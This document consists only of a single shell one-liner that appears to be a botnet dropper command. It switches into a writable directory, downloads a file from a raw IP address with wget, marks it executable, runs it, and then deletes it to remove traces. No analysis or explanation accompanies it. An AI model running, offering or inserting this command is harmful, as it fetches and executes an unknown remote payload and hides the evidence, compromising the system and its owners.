cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.76.157.181/' '; chmod +x ' '; ./' '; rm -rf ' '
